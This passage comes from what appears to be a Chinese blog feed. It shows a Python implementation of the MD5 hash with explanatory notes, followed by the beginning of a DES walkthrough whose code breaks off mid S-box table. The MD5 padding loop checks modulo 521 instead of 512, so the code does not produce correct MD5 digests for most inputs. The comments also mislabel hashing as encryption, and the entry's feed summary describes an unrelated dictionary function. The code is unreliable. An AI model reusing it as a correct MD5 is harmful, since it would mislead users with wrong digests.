0x4787c62a, 0xa8304613, 0xfd469501, 0x698098d8, 0x8b44f7af,  0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e,  0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,  0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8, 0x21e1cde6,  0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8,  0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681, 0x6d9d6122,  0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,  0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039,  0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244, 0x432aff97,  0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d,  0x85845dd1, 0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,  0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 ]</p><p>si=[7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 4, 11,16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15,21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]</p><p>共四轮运算</p><h3 id="每轮循环"><a href="#每轮循环" class="headerlink" title="每轮循环"></a>每轮循环</h3><p>每轮循环后，将A，B，C，D分别加上a，b，c，d，然后进入下一循环。</p><p>贴一个图便于理解</p><p><img src="https://i.imgur.com/oyEyUAP.png" alt=""></p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse32</span><span class="params">(bitString32)</span>:</span>    <span class="comment">#32位2进制大端转小端,返回32位2进制流</span></span><br><span class="line">    newString=<span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(bitString32)!=<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"需要32位"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>]:</span><br><span class="line">        newString+=bitString32[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">return</span> newString</span><br><span class="line"><span class="comment">#a=bin(int('0xabcdefef',16))[2:]</span></span><br><span class="line"><span class="comment">#print(rearrange(a))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reversehex</span><span class="params">(num)</span>:</span>       <span class="comment">#整数转化为8位16进制数，小端转大端输出</span></span><br><span class="line">    hexformat=format(num,<span class="string">'08x'</span>)</span><br><span class="line">    newString=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>]:</span><br><span class="line">        newString+=hexformat[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> newString</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(bitString)</span>:</span>    <span class="comment">#填充位为512bit整数倍,先补充1和0,为448bit,将原始消息长度以64bit填充后面，返回二进制流</span></span><br><span class="line">    startLength=len(bitString)</span><br><span class="line">    bitString+=<span class="string">'1'</span></span><br><span class="line">    <span class="keyword">while</span> len(bitString)%<span class="number">521</span>!=<span class="number">448</span>:</span><br><span class="line">        bitString+=<span class="string">'0'</span></span><br><span class="line">    lastPart = format(startLength, <span class="string">'064b'</span>)</span><br><span class="line">    bitString+=reverse32(lastPart[<span class="number">32</span>:])+reverse32(lastPart[<span class="number">0</span>:<span class="number">32</span>])</span><br><span class="line">    <span class="keyword">return</span> bitString</span><br><span class="line"><span class="comment">#print(fill('1000'))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGroup</span><span class="params">(bitString)</span>:</span>    <span class="comment">#512bit为一个分组共N+1，将每一个分组消息分成16个子分组，每个子分组32bit，返回二进制流。</span></span><br><span class="line">    currPos=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> currPos&lt;len(bitString):</span><br><span class="line">        currPart=bitString[currPos:currPos+<span class="number">512</span>]</span><br><span class="line">        mySplits=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            mySplits.append(int(reverse32(currPart[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>]),<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">yield</span> mySplits</span><br><span class="line">        currPos+=<span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leftrot32</span><span class="params">(x,n)</span>:</span>      <span class="comment">#循环左移</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum32</span><span class="params">(a,b)</span>:</span>     <span class="comment">#四轮完成后进行加运算</span></span><br><span class="line">    <span class="keyword">return</span> (a+b)%(<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5encrypt</span><span class="params">(testString)</span>:</span> <span class="comment">#md5加密实现</span></span><br><span class="line">    text=<span class="string">''</span>              <span class="comment">#将每个字符固定为8位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> testString:</span><br><span class="line">        text+=format(ord(i),<span class="string">'08b'</span>)</span><br><span class="line">    text=fill(text)</span><br><span class="line"></span><br><span class="line">    t = [int(math.floor((<span class="number">2</span> ** <span class="number">32</span>) * abs(math.sin(i + <span class="number">1</span>)))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">    s = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">    A0 = <span class="number">0x67452301</span></span><br><span class="line">    B0 = <span class="number">0xefcdab89</span></span><br><span class="line">    C0 = <span class="number">0x98badcfe</span></span><br><span class="line">    D0 = <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> getGroup(text):    <span class="comment">#初始化寄存器</span></span><br><span class="line">        A = A0</span><br><span class="line">        B = B0</span><br><span class="line">        C = C0</span><br><span class="line">        D = D0</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):       <span class="comment">#执行4轮轮询共64步，每一轮16步。输入为4个32bit链接变量和32bit子分组，输出32bit</span></span><br><span class="line">            <span class="keyword">if</span> i &lt;= <span class="number">15</span>:</span><br><span class="line">                f = (B &amp; C) | ((~B) &amp; D)</span><br><span class="line">                g = i</span><br><span class="line">            <span class="keyword">elif</span> i &lt;= <span class="number">31</span>:</span><br><span class="line">                f = (B &amp; D) | ( C&amp; (~D))</span><br><span class="line">                g = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">elif</span> i &lt;= <span class="number">47</span>:</span><br><span class="line">                f = B ^ C ^ D</span><br><span class="line">                g = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = C ^ (B | ~D)</span><br><span class="line">                g = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line">            dtemp=D</span><br><span class="line">            D = C</span><br><span class="line">            C = B</span><br><span class="line">            B=sum32(B, leftrot32((A + f +m[g]+ t[i]) % (<span class="number">2</span> ** <span class="number">32</span>), s[i]))</span><br><span class="line">            A=dtemp</span><br><span class="line"></span><br><span class="line">        A0 = sum32(A, A0)            <span class="comment">#四轮完成后作加法模运算，ABCD值作为下一轮迭代压缩的链接变量</span></span><br><span class="line">        B0 = sum32(B, B0)</span><br><span class="line">        C0 = sum32(C, C0)</span><br><span class="line">        D0 = sum32(D, D0)</span><br><span class="line"></span><br><span class="line">    digest = reversehex(A0)+reversehex(B0)+reversehex(C0)+reversehex(D0)    <span class="comment">#大小端转换输出摘要</span></span><br><span class="line">    <span class="keyword">return</span> digest</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    plaintext=input(<span class="string">"输入加密字符串: "</span>)</span><br><span class="line">    print(md5encrypt(plaintext))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;hash函数实现&quot;&gt;&lt;a href=&quot;#hash函数实现&quot; class=&quot;headerlink&quot; title=&quot;hash函数实现&quot;&gt;&lt;/a&gt;hash函数实现&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;update() 函数把字典参数 dict2 的 key/value(键/值) 
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>DES实现</title>
    <link href="http://yoursite.com/2018/12/25/DES/"/>
    <id>http://yoursite.com/2018/12/25/DES/</id>
    <published>2018-12-24T16:00:00.000Z</published>
    <updated>2018-12-28T08:11:51.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DES思路"><a href="#DES思路" class="headerlink" title="DES思路"></a>DES思路</h1><p>1.首先输入64bit密钥<br>2.将64bit密钥经过PC-1盒变成56bit<br>3.将56bit分为C0和D0，分别28bit<br>4.将C0，D0分别循环移位，得到C1，D1<br>5.将C1，D1拼接，经过PC-2盒变成48bit子密钥key1<br>6.重复步骤4<br>7.生成16组子密钥<br>这里真实加密只用到56bit，后面会有文章借助一道DES题目细致讲解这个密钥编排<br>F函数</p><p>1.将输入的32bit的R经过E盒生成48bit<br>2.将该48bit值与子密钥异或<br>3.将异或后的值经过S盒置换，又变回32bit<br>4.将值经过P盒置换<br>5.将32bit值与L进行异或得到下一个R<br>加密程序</p><p>1.输入64bit明文<br>2.经过IP盒置换打乱生成str<br>3.将str分为L0和R0，分别32bit<br>4.以下重复15次：<br>5.将Ri经过F函数处理，再与Li异或，然后将值赋给R(i+1)<br>6.将Ri赋值给L(i+1)<br>7.最后一轮，直接将Ri赋给R(i+1),再将Ri经过F函数处理，再与Li异或，然后将值赋给L(i+1)<br>8.将L和R合并后经过逆IP盒，得到密文C</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">s1 = [</span><br><span class="line">    [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line">s2 = [</span><br><span class="line">    [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]]</span><br><span class="line"></span><br><span class="line">s3 = [</span><br><span class="line">    [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]]</span><br><span class="line"></span><br><span class="line">s4 = [</span><br><span class="line">    [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line">s5 = [</span><br><span class="line">    [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">s6 = [</span><br><span class="line">    [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">    [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span 